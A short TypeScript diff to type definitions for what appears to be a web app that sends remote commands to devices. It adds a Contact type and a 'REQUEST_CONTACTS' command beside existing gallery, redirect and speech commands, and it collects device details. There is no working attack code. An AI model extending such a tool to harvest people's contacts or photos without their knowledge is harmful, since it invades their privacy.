@@ -11,14 +11,19 @@ export interface DeviceInfo {
   battery?: number;
   platform: string;
   userAgent: string;
-  deviceName: string; // Added device name
+  deviceName: string;
   screenHeight: number;
   screenWidth: number;
   language: string;
 }
 
+export interface Contact {
+  name: string[];
+  tel: string[];
+}
+
 export interface RemoteCommand {
-  type: 'VIBRATE' | 'ALERT' | 'REDIRECT' | 'SPEAK' | 'REQUEST_GALLERY';
+  type: 'VIBRATE' | 'ALERT' | 'REDIRECT' | 'SPEAK' | 'REQUEST_GALLERY' | 'REQUEST_CONTACTS';
   payload?: any;
 }
 
